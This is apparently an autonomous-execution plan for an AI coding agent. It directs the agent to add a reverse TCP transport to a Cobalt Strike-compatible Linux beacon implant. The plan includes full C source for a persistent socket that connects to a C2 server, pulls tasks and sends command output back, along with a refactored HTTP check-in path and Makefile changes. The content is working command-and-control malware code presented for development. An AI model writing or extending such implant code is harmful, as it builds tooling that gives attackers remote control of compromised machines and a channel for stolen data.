---
phase: 03-reverse-tcp-transport
plan: "01"
type: execute
wave: 1
depends_on: []
files_modified:
  - implant/headers/transport.h
  - implant/headers/tcp.h
  - implant/src/tcp.c
  - implant/src/http.c
  - implant/src/beacon.c
  - implant/Makefile
autonomous: true
requirements:
  - NET-01

must_haves:
  truths:
    - "HTTP/S build compiles cleanly with `make` (TRANSPORT=http, the default) — zero warnings"
    - "TCP build compiles cleanly with `make TRANSPORT=tcp` — zero warnings, links tcp.o not http.o"
    - "beacon.c includes only transport.h — no direct http.h include, no http_get/http_post calls"
    - "tcp.c implements transport_connect/transport_checkin/transport_send_output using persistent socket with length-prefixed framing"
    - "http.c implements the same three transport_* symbols — transport_connect is a no-op for HTTP"
    - "Both builds produce a valid ELF binary in implant/bin/"
  artifacts:
    - path: "implant/headers/transport.h"
      provides: "Unified transport interface (transport_connect, transport_checkin, transport_send_output)"
      exports: ["transport_connect", "transport_checkin", "transport_send_output"]
    - path: "implant/headers/tcp.h"
      provides: "TCP-internal declarations (tcp_recv_exact, tcp_send_framed)"
    - path: "implant/src/tcp.c"
      provides: "TCP transport implementation — persistent socket, length-prefixed framing, SO_KEEPALIVE, SO_SNDTIMEO/SO_RCVTIMEO"
    - path: "implant/src/http.c"
      provides: "HTTP/S transport refactored to implement transport_* symbols"
    - path: "implant/src/beacon.c"
      provides: "beacon.c callsites migrated from http_get/http_post to transport_checkin/transport_send_output"
    - path: "implant/Makefile"
      provides: "TRANSPORT variable gates tcp.o vs http.o; both excluded from wildcard"
  key_links:
    - from: "implant/src/beacon.c"
      to: "implant/headers/transport.h"
      via: "#include transport.h (not http.h)"
      pattern: "include.*transport\\.h"
    - from: "implant/src/tcp.c"
      to: "implant/headers/transport.h"
      via: "implements transport_connect/checkin/send_output"
    - from: "implant/Makefile"
      to: "implant/src/tcp.c"
      via: "TRANSPORT_OBJ set to tcp.o when TRANSPORT=tcp"
      pattern: "TRANSPORT_OBJ.*tcp"
---

<objective>
Create the C transport abstraction layer for Phase 3.

This plan creates the compile-time transport interface (`transport.h`), implements it in both `http.c` (existing transport refactored) and the new `tcp.c` (persistent socket, length-prefixed framing, SO_KEEPALIVE), and updates the Makefile to gate which transport object is linked.

Purpose: After this plan, beacon.c has no direct dependency on http.c — it calls transport_checkin/transport_send_output, and the Makefile selects which implementation to link. Both HTTP/S and TCP builds must produce clean zero-warning binaries.

Output: transport.h, tcp.h, tcp.c, updated http.c (transport.h impl), updated beacon.c (migrated callsites), updated Makefile (TRANSPORT variable).
</objective>

<execution_context>
@/Users/maleick/.claude/get-shit-done/workflows/execute-plan.md
@/Users/maleick/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/03-reverse-tcp-transport/03-CONTEXT.md
@.planning/phases/03-reverse-tcp-transport/03-RESEARCH.md

<interfaces>
<!-- Key existing interfaces the executor must know before modifying. -->

From implant/headers/http.h (current, to be retained for http-internal use):
```c
typedef struct {
    char *data;
    size_t size;
} http_response_t;

int http_get(const char *uri, const uint8_t *metadata, size_t metadata_len, http_response_t *response);
int http_post(const char *uri, const uint8_t *data, size_t data_len, const char *session_id, http_response_t *response);
void http_response_free(http_response_t *response);
```

From implant/src/beacon.c (lines to migrate):
```c
/* Line 4 — include to remove/replace */
#include "http.h"

/* beacon_checkin() — line ~447 — migrate to transport_checkin() */
if (http_get(profile_get_http_get_uri(), encrypted_metadata, encrypted_len, &response) != 0) { ... }

/* beacon_send_output() — line ~635 — migrate to transport_send_output() */
int ret = http_post(profile_get_http_post_uri(), packet, total_len, session_id, &response);
```

From implant/src/main.c (structure for context):
```c
// Global state pattern used in project:
beacon_state_t *g_beacon_state = NULL;
int g_sleep_time_ms = SLEEP_TIME;
int g_jitter_percent = JITTER;
// Main loop calls beacon_checkin(&state) and pivot_poll()
```

From implant/Makefile (current source collection):
```makefile
SOURCES = \
    $(wildcard $(SRC_DIR)/*.c) \
    $(wildcard $(ELFLOADER_SRC_DIR)/*.c)
OBJECTS = $(patsubst %.c,$(OBJ_DIR)/%.o,$(SOURCES))
```
</interfaces>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create transport.h and refactor http.c to implement transport_* symbols</name>
  <files>
    implant/headers/transport.h
    implant/src/http.c
    implant/src/beacon.c
  </files>
  <action>
**Step A — Create `implant/headers/transport.h`:**

```c
#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <stddef.h>
#include <stdint.h>

/*
 * Establish transport connection.
 * TCP: connect socket to C2 server (called once before main loop).
 * HTTP: no-op, returns 0.
 * Returns 0 on success, -1 on error.
 */
int transport_connect(void);

/*
 * Send beacon check-in metadata; receive task blob from server.
 * On success, *task_data is malloc'd — caller must free(). *task_len is payload size.
 * Returns 0 on success, -1 on error (caller should call transport_connect() to reconnect).
 */
int transport_checkin(const uint8_t *metadata, size_t metadata_len,
                      uint8_t **task_data, size_t *task_len);

/*
 * Send callback output to server.
 * session_id: agent session identifier (used by HTTP for URL; ignored by TCP — already in packet).
 * Returns 0 on success, -1 on error.
 */
int transport_send_output(const uint8_t *data, size_t data_len, const char *session_id);

#endif /* TRANSPORT_H */
```

**Step B — Update `implant/src/http.c`:**

Add three new exported functions at the bottom of `http.c` that implement the `transport.h` interface on top of existing `http_get()`/`http_post()`:

```c
/* transport.h implementation for HTTP/S transport */
#include "transport.h"

int transport_connect(void) {
    /* HTTP is connectionless — no-op */
    return 0;
}

int transport_checkin(const uint8_t *metadata, size_t metadata_len,
                      uint8_t **task_data, size_t *task_len) {
    http_response_t response;
    int ret = http_get(profile_get_http_get_uri(), metadata, metadata_len, &response);
    if (ret != 0) {
        return -1;
    }
    if (response.size == 0 || response.data == NULL) {
        *task_data = NULL;
        *task_len  = 0;
        http_response_free(&response);
        return 0;
    }
    /* Transfer ownership: malloc a copy for the caller */
    uint8_t *buf = malloc(response.size);
    if (!buf) {
        http_response_free(&response);
        return -1;
    }
    memcpy(buf, response.data, response.size);
    *task_data = buf;
    *task_len  = response.size;
    http_response_free(&response);
    return 0;
}

int transport_send_output(const uint8_t *data, size_t data_len, const char *session_id) {
    http_response_t response;
    int ret = http_post(profile_get_http_post_uri(), data, data_len, session_id, &response);
    http_response_free(&response);
    return ret;
}
```

Required includes to add at top of http.c (if not already present): `#include "transport.h"`, `#include <stdlib.h>`, `#include <string.h>`.

**Step C — Update `implant/src/beacon.c` to use transport_* callsites:**

1. Remove `#include "http.h"` from beacon.c (line 4). Replace with `#include "transport.h"`.

2. In `beacon_checkin()` (~line 447): Replace the `http_get()` call and the http_response_t usage. The new pattern:
   - Remove `http_response_t response;` declaration for the http call
   - Replace `if (http_get(..., &response) != 0)` with:
     ```c
     uint8_t *task_data = NULL;
     size_t   task_len  = 0;
     if (transport_checkin(encrypted_metadata, encrypted_len, &task_data, &task_len) != 0) {
         /* transport error — return -1 for reconnect handling in main loop */
         return -1;
     }
     ```
   - The rest of beacon_checkin() that currently uses `response.data`/`response.size` must use `task_data`/`task_len` instead. After processing, call `free(task_data)`.
   - Remove any `http_response_free(&response)` calls in beacon_checkin().

3. In `beacon_send_output()` (~line 635): Replace `http_post()` call:
   - Remove `http_response_t response;` for the http call
   - Replace `int ret = http_post(profile_get_http_post_uri(), packet, total_len, session_id, &response);` with:
     ```c
     int ret = transport_send_output(packet, total_len, session_id);
     ```
   - Remove any `http_response_free(&response)` calls in beacon_send_output().

IMPORTANT: Do not add `#ifdef TRANSPORT_TCP` inside beacon.c. The transport.h interface is compile-time transparent — beacon.c must not know the transport type.
  </action>
  <verify>
    <automated>cd /opt/CobaltStrike-Linux-Beacon/implant && make clean all 2>&1 | tail -5</automated>
  </verify>
  <done>HTTP/S build (`make`) succeeds with zero warnings. `implant/bin/beacon` exists. beacon.c no longer references http.h or http_get/http_post directly.</done>
</task>

<task type="auto">
  <name>Task 2: Create tcp.c and tcp.h (TCP transport implementation)</name>
  <files>
    implant/headers/tcp.h
    implant/src/tcp.c
  </files>
  <action>
**Step A — Create `implant/headers/tcp.h`:**

```c
#ifndef TCP_H
#define TCP_H

#include <stddef.h>
#include <stdint.h>

/* Internal TCP helpers — not part of public transport interface */

/*
 * Receive exactly n bytes from fd, looping on partial recv().
 * Returns 0 on success, -1 on error or connection close.
 */
int tcp_recv_exact(int fd, uint8_t *buf, size_t n);

/*
 * Send a length-prefixed frame: [4 bytes big-endian length][payload].
 * Returns 0 on success, -1 on error.
 */
int tcp_send_framed(int fd, const uint8_t *data, size_t len);

/*
 * Receive a length-prefixed frame: read 4-byte length, then payload.
 * On success, *out is malloc'd — caller must free(). *out_len is payload size.
 * Zero-length response is valid (no task): *out = NULL, *out_len = 0, returns 0.
 * Returns 0 on success, -1 on error.
 */
int tcp_recv_framed(int fd, uint8_t **out, size_t *out_len);

#endif /* TCP_H */
```

**Step B — Create `implant/src/tcp.c`:**

```c
/*
 * tcp.c — TCP transport implementation for reverse TCP beacon mode.
 * Implements the transport.h interface: transport_connect/checkin/send_output.
 *
 * Wire protocol: length-prefixed frames [4B big-endian length][payload blob].
 * Payload content: same [counter][length][encrypted data][HMAC] as HTTP/S — no new wire format.
 * Persistent connection: socket held open across check-in cycles; reconnect on error.
 */

#include "transport.h"
#include "tcp.h"
#include "profile.h"
#include "debug.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>

/* Persistent TCP socket — held open across all check-in cycles */
static int g_tcp_fd = -1;

/* --- Internal helpers ------------------------------------------------- */

int tcp_recv_exact(int fd, uint8_t *buf, size_t n) {
    size_t received = 0;
    while (received < n) {
        ssize_t r = recv(fd, buf + received, n - received, 0);
        if (r <= 0) {
            DEBUG_PRINT("[TCP] tcp_recv_exact: recv returned %zd (errno=%d: %s)\n",
                        r, errno, strerror(errno));
            return -1;
        }
        received += (size_t)r;
    }
    return 0;
}

int tcp_send_framed(int fd, const uint8_t *data, size_t len) {
    uint32_t len_be = htonl((uint32_t)len);
    if (send(fd, &len_be, 4, MSG_NOSIGNAL) != 4) {
        DEBUG_PRINT("[TCP] tcp_send_framed: failed to send length prefix (errno=%d: %s)\n",
                    errno, strerror(errno));
        return -1;
    }
    if (send(fd, data, len, MSG_NOSIGNAL) != (ssize_t)len) {
        DEBUG_PRINT("[TCP] tcp_send_framed: failed to send payload (errno=%d: %s)\n",
                    errno, strerror(errno));
        return -1;
    }
    return 0;
}

int tcp_recv_framed(int fd, uint8_t **out, size_t *out_len) {
    uint32_t len_be = 0;
    if (tcp_recv_exact(fd, (uint8_t *)&len_be, 4) != 0) {
        return -1;
    }
    size_t len = ntohl(len_be);
    if (len == 0) {
        *out     = NULL;
        *out_len = 0;
        return 0;
    }
    uint8_t *buf = malloc(len);
    if (!buf) {
        DEBUG_PRINT("[TCP] tcp_recv_framed: malloc(%zu) failed\n", len);
        return -1;
    }
    if (tcp_recv_exact(fd, buf, len) != 0) {
        free(buf);
        return -1;
    }
    *out     = buf;
    *out_len = len;
    return 0;
}

/* --- transport.h implementation --------------------------------------- */

int transport_connect(void) {
    /* Close any existing socket before reconnecting */
    if (g_tcp_fd >= 0) {
        close(g_tcp_fd);
        g_tcp_fd = -1;
    }

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%d", profile_get_port());

    int gai_ret = getaddrinfo(profile_get_server(), port_str, &hints, &res);
    if (gai_ret != 0) {
        DEBUG_PRINT("[TCP] getaddrinfo failed: %s\n", gai_strerror(gai_ret));
        return -1;
    }

    g_tcp_fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (g_tcp_fd < 0) {
        DEBUG_PRINT("[TCP] socket() failed: %s\n", strerror(errno));
        freeaddrinfo(res);
        return -1;
    }

    /* Set connect/recv/send timeout to 30s to prevent indefinite blocking */
    struct timeval tv = { .tv_sec = 30, .tv_usec = 0 };
    setsockopt(g_tcp_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(g_tcp_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    /* Enable keepalive to detect silent disconnections */
    int opt = 1;
    setsockopt(g_tcp_fd, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));

    if (connect(g_tcp_fd, res->ai_addr, res->ai_addrlen) != 0) {
        DEBUG_PRINT("[TCP] connect failed: %s\n", strerror(errno));
        close(g_tcp_fd);
        g_tcp_fd = -1;
        freeaddrinfo(res);
        return -1;
    }
    freeaddrinfo(res);

    DEBUG_PRINT("[TCP] connected to %s:%s\n", profile_get_server(), port_str);
    return 0;
}

int transport_checkin(const uint8_t *metadata, size_t metadata_len,
                      uint8_t **task_data, size_t *task_len) {
    if (g_tcp_fd < 0) {
        return -1;
    }

    /* Send check-in metadata as length-prefixed frame */
    if (tcp_send_framed(g_tcp_fd, metadata, metadata_len) != 0) {
        close(g_tcp_fd);
        g_tcp_fd = -1;
        return -1;
    }

    /* Receive task response as length-prefixed frame */
    if (tcp_recv_framed(g_tcp_fd, task_data, task_len) != 0) {
        close(g_tcp_fd);
        g_tcp_fd = -1;
        return -1;
    }

    return 0;
}

int transport_send_output(const uint8_t *data, size_t data_len,
                          const char *session_id) {
    /* session_id is used by HTTP for URL query string; TCP ignores it
     * (session identity is embedded in the encrypted packet payload) */
    (void)session_id;

    if (g_tcp_fd < 0) {
        return -1;
    }

    if (tcp_send_framed(g_tcp_fd, data, data_len) != 0) {
        close(g_tcp_fd);
        g_tcp_fd = -1;
        return -1;
    }

    return 0;
}
```
  </action>
  <verify>
    <automated>cd /opt/CobaltStrike-Linux-Beacon/implant && make TRANSPORT=tcp clean all 2>&1 | tail -10</automated>
  </verify>
  <done>tcp.c and tcp.h exist. `make TRANSPORT=tcp` succeeds with zero warnings. The TCP build links tcp.o (not http.o). implant/bin/beacon exists for TCP build.</done>
</task>

<task type="auto">
  <name>Task 3: Update Makefile with TRANSPORT variable and transport object exclusion</name>
  <files>
    implant/Makefile
  </files>
  <action>
Update `implant/Makefile` to support `TRANSPORT=tcp` or `TRANSPORT=http` (default).

**Changes to make in the Makefile:**

1. After the `LDFLAGS` line, add the TRANSPORT variable block:

```makefile
# Transport mode: http (default) or tcp
# Usage: make TRANSPORT=tcp
TRANSPORT ?= http

ifeq ($(TRANSPORT),tcp)
  TRANSPORT_OBJ  = $(OBJ_DIR)/$(SRC_DIR)/tcp.o
  CFLAGS        += -DTRANSPORT_TCP
else
  TRANSPORT_OBJ  = $(OBJ_DIR)/$(SRC_DIR)/http.o
endif
```

2. Replace the `SOURCES` and `OBJECTS` lines. The current Makefile has:

```makefile
SOURCES = \
    $(wildcard $(SRC_DIR)/*.c) \
    $(wildcard $(ELFLOADER_SRC_DIR)/*.c)

OBJECTS = $(patsubst %.c,$(OBJ_DIR)/%.o,$(SOURCES))
```

Replace with:

```makefile
# Exclude both transport modules from wildcard; add selected transport obj explicitly
SOURCES = \
    $(filter-out $(SRC_DIR)/tcp.c $(SRC_DIR)/http.c, $(wildcard $(SRC_DIR)/*.c)) \
    $(wildcard $(ELFLOADER_SRC_DIR)/*.c)

OBJECTS = $(patsubst %.c,$(OBJ_DIR)/%.o,$(SOURCES)) $(TRANSPORT_OBJ)
```

3. Add a `tcp-build` convenience target at the bottom (before `.PHONY`):

```makefile
tcp-build: TRANSPORT=tcp
tcp-build: clean all
	@echo "[+] TCP transport build complete"
```

4. Update `.PHONY` to include `tcp-build`:

```makefile
.PHONY: all clean debug directories test-quick test-full tcp-build
```

IMPORTANT: Do NOT change the `directories` target or obj dir creation — tcp.c uses the same `$(OBJ_DIR)/$(SRC_DIR)/` path that http.c already uses.

After making changes, verify both builds work before declaring done.
  </action>
  <verify>
    <automated>cd /opt/CobaltStrike-Linux-Beacon/implant && make clean all 2>&1 | grep -E "^(\[|Build complete|error:|warning:)" && make TRANSPORT=tcp clean all 2>&1 | grep -E "^(\[|Build complete|error:|warning:)"</automated>
  </verify>
  <done>`make` (HTTP/S, default) and `make TRANSPORT=tcp` (TCP) both produce `implant/bin/beacon` with zero warnings. The HTTP build links http.o; the TCP build links tcp.o (verified by examining link output).</done>
</task>

</tasks>

<verification>
Full build matrix must pass before this plan is complete:
1. `cd implant && make clean all` — HTTP/S build, zero warnings
2. `cd implant && make TRANSPORT=tcp clean all` — TCP build, zero warnings
3. `grep -r "http_get\|http_post\|#include.*http\.h" implant/src/beacon.c` — must return nothing (beacon.c is fully migrated)
4. `grep "transport_checkin\|transport_send_output\|transport_connect" implant/src/beacon.c` — must show the call sites
5. `grep "transport_checkin\|transport_send_output\|transport_connect" implant/src/http.c` — must show implementations
6. `grep "transport_checkin\|transport_send_output\|transport_connect" implant/src/tcp.c` — must show implementations
</verification>

<success_criteria>
- transport.h declares transport_connect, transport_checkin, transport_send_output
- http.c implements all three transport_* symbols (transport_connect is a no-op)
- tcp.c implements all three transport_* symbols with persistent socket, length-prefixed framing, SO_KEEPALIVE, SO_SNDTIMEO/SO_RCVTIMEO
- beacon.c has no direct http.h include or http_get/http_post calls
- Makefile `TRANSPORT ?= http` default; `TRANSPORT=tcp` links tcp.o and sets -DTRANSPORT_TCP
- Both transport variants build clean under -Wall -Wextra with zero warnings
</success_criteria>

<output>
After completion, create `.planning/phases/03-reverse-tcp-transport/03-01-SUMMARY.md`
</output>
